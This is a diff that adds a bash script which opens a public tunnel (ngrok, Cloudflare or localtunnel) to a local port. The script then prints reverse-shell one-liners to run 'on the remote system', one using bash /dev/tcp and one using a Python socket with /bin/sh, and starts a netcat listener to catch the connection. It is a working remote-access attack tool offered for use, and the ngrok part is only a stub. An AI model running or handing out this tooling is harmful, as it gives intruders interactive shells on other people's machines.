@@ -1,0 +1,90 @@
+#!/bin/bash
+
+# Get the directory where this script is located
+SCRIPT_DIR=$(dirname "$0")
+
+# Source the funcs.sh file
+source "$SCRIPT_DIR/funcs.sh"
+
+# Function to set up ngrok tunnel
+setup_ngrok() {
+    local PORT="$1"
+    # ... [existing ngrok setup code] ...
+}
+
+# Function to set up Cloudflare tunnel
+setup_cloudflare() {
+    local PORT="$1"
+    echo "Setting up Cloudflare tunnel..."
+    # Check if cloudflared is installed
+    if ! command -v cloudflared &> /dev/null; then
+        echo -e "${CR}cloudflared is not installed. Please install it to use Cloudflare tunneling.${CN}"
+        exit 1
+    fi
+    # Start Cloudflare tunnel
+    TUNNEL_URL=$(cloudflared tunnel --url "tcp://localhost:$PORT" 2>&1 | grep -oP 'https://[^ ]+\.trycloudflare\.com' | head -n 1)
+    TUNNEL_HOST=$(echo $TUNNEL_URL | sed 's|https://||')
+    TUNNEL_IP=$(dig +short $TUNNEL_HOST)
+    echo -e "${CG}Cloudflare tunnel established: $TUNNEL_URL${CN}"
+    echo -e "${CC}Tunnel IP: $TUNNEL_IP${CN}"
+}
+
+# Function to set up localtunnel
+setup_localtunnel() {
+    local PORT="$1"
+    echo "Setting up localtunnel..."
+    # Check if localtunnel is installed
+    if ! command -v lt &> /dev/null; then
+        echo -e "${CR}localtunnel is not installed. Please install it using 'npm install -g localtunnel'.${CN}"
+        exit 1
+    fi
+    # Start localtunnel
+    TUNNEL_URL=$(lt --port $PORT --print-requests false)
+    TUNNEL_HOST=$(echo $TUNNEL_URL | sed 's|https://||')
+    TUNNEL_IP=$(dig +short $TUNNEL_HOST)
+    echo -e "${CG}Localtunnel established: $TUNNEL_URL${CN}"
+    echo -e "${CC}Tunnel IP: $TUNNEL_IP${CN}"
+}
+
+# Main function
+main() {
+    if [ $# -lt 2 ]; then
+        echo -e "${CR}Usage: $0 <tunneling-service> <port>${CN}"
+        echo -e "${CB}Supported tunneling services: ngrok, cloudflare, localtunnel${CN}"
+        echo -e "${CB}Example: $0 ngrok 8080${CN}"
+        exit 1
+    fi
+
+    TUNNELING_SERVICE="$1"
+    PORT="$2"
+
+    case $TUNNELING_SERVICE in
+        ngrok)
+            setup_ngrok "$PORT"
+            ;;
+        cloudflare)
+            setup_cloudflare "$PORT"
+            ;;
+        localtunnel)
+            setup_localtunnel "$PORT"
+            ;;
+        *)
+            echo -e "${CR}Unsupported tunneling service: $TUNNELING_SERVICE${CN}"
+            echo -e "${CB}Supported services: ngrok, cloudflare, localtunnel${CN}"
+            exit 1
+            ;;
+    esac
+
+    # Generate reverse shell commands
+    echo -e "${CG}┌──--------------------------------------------------------${CN}"
+    echo -e "${CY}| Use one of these commands on the remote system:${CN}"
+    echo -e "${CM}|  1. ${CDB}bash -c '(exec bash -i &>/dev/tcp/$TUNNEL_IP/$PORT 0>&1) &'${CN}"
+    echo -e "${CC}|  2. ${CDB}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$TUNNEL_IP\",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'${CN}"
+    echo -e "${CG}└──--------------------------------------------------------${CN}"
+
+    # Start the listener
+    echo -e "${CY}Starting listener on port $PORT...${CN}"
+    nc -nvlp "$PORT"
+}
+
+main "$@"
